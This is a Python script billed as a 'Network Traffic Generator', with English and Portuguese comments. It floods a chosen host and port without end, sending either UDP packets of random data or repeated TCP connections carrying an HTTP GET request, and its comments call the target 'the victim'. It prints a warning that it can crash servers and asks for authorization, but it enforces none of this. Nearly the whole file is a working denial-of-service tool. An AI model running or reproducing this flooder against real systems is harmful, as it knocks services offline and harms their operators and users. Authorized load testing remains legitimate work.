
import socket, os, sys, time, threading

packetcount = 1 # only for counting the number of packages sent / somente para fazer a contagem de pacotes enviados

#Lines for formatting the program in the terminal / linhas para formatação do programa no terminal
def hashtag_line():
    print("###########################################################################################################")

def line():
    print("-----------------------------------------------------------------------------------------------------------")

def clear_terminal():
    if os.name == 'nt':
        os.system('cls')
    else: 
        os.system('clear')

#presentation / apresentacao
clear_terminal()
hashtag_line()
print()
print("                                         Network Traffic Generator")
print("                 Repositório GitHub: https://github.com/Bartzin55/Network-Traffic-Generator")
print()
hashtag_line()
#ip/hostname request / solicitação do ip/hostname
ip_or_hostname = input("\nEnter the destination hostname or IP address (Ipv4 only) or Hostname: ")

#port request / solicitação da porta
strport = input("Enter the port: ")

#user input validation / validação da entrada do usuário
try:
    port = int(strport)
except (ValueError):
    print("Invalid Value.")
    sys.exit()

# protocol choice input
protocol_choice = input("\nSelect the protocol (tcp/udp): ")
#user input validationa and sub-selections, depending on the chosen protocol.

##packet size request in the case of the UDP protocol / solicitação do tamanho do pacote de dados em caso do protocolo UDP
if protocol_choice == "udp":
    strpacketsize = input("Enter the size in bytes of the data packet (minimum: 1 | recommended: 1472 | Maximum: 9000): ")
    
    # user input validation
    try:
        packetsize = int(strpacketsize)
    except:
        print("Invalid value")
        sys.exit()

    if packetsize < 1 or packetsize > 9000:
        print("Invalid value (minimum: 1 | Maximum: 9000)")
        sys.exit()
    
    #generate random data to send it to the victim / gerar dados aleatórios para enviar à vítima
    packet = os.urandom(packetsize)

elif protocol_choice == "tcp":
    print("OBS: Currently, this script is not able to effectively affect HTTPS servers.")
    http_server_validation = input('The "Victim" is a HTTP server (y/n)?')
    if http_server_validation == "y":
        packet = (
            "GET / HTTP/1.1\r\n"
            f"Host: {ip_or_hostname}\r\n"
            "User-Agent: FloodTest/1.0\r\n"
            "Accept: */*\r\n"
            "Connection: keep-alive\r\n"
            "\r\n"
        ).encode()
        packetsize = "~100 bytes"
    elif http_server_validation == "n":
            strpacketsize = input("Enter the size in bytes of the data packet (minimum: 1 | recommended: 1472 | Maximum: 9000): ")
    
            # user input validation
            try:
                packetsize = int(strpacketsize)
            except:
                print("Invalid value")
                sys.exit()

            if packetsize < 1 or packetsize > 9000:
                print("Invalid value (minimum: 1 | Maximum: 9000)")
                sys.exit()
            #generate random data to send it to the victim / gerar dados aleatórios para enviar à vítima
            packet = os.urandom(packetsize)
    else:
        print("Invalid option.")
        sys.exit()
else:
    print("Invalid option.")
    sys.exit()

######################################################################

#destination in a tuple (ip, port) / destino em uma tupla (ip, porta)
destination = (ip_or_hostname,port)

#Confirmation / Confirmação
print()
time.sleep(0.7)
print(".",end="",flush=True)
time.sleep(0.7)
print(".",end="",flush=True)
time.sleep(0.7)
print(".",end="",flush=True)
time.sleep(0.7)
print()

clear_terminal()
line()
print("-------------------------------------------------| INFOS |-------------------------------------------------")
print("\nThe recommended packet size is 1472 bytes because that's what most networks support.\nIf you know your network and the MTU it supports, feel free to configure larger packets.\n")
line()
print("-------------------------------------------------| REVIEW |------------------------------------------------")
print(f"\nIP address/hostname: {ip_or_hostname}\nPort: {port}\nPacket size: {packetsize}\nProtocol: protocol: {protocol_choice.upper()}\n")
line()
print("------------------------------------------------| WARNING |------------------------------------------------")
print("\n          THIS TOOL CAN POTENTIALLY CAUSE SLOWDOWNS OR EVEN CRASH A SERVER OR AN ENTIRE NETWORK.")
print("                                  USE ONLY FOR EDUCATIONAL AND TESTING PURPOSES.")
print("                       ONLY PERFORM TESTS WITH AUTHORIZATION FROM THE NETWORK ADMINISTRATOR.\n")
line()
print("\nAfter confirmation, the packet transmission will begin. You can interrupt it at any time with CONTROL + C\n")
confirmation = input("Type (Y/y) to start, or press any key to cancel: ")
if confirmation != "y" and confirmation != "Y":
    print("Operation cancelled.")
    sys.exit()

#sending packets / enviando pacotes
if protocol_choice == "udp":
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(packet,destination)
        if packetcount % 10000 == 0:
            print(f"Sent {packetcount} data packet to {ip_or_hostname}:{port} | Packet size: {packetsize} bytes | Protocol: {protocol_choice.upper()}")
        packetcount += 1
else:
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect(destination)
            sock.send(packet)
            sock.close()
            packetcount += 1
            print(f"Sent {packetcount} data packet to {ip_or_hostname}:{port} | Packet size: {packetsize} bytes | protocol: {protocol_choice.upper()}")
        except:
            print("Destination not found.")
            sys.exit()

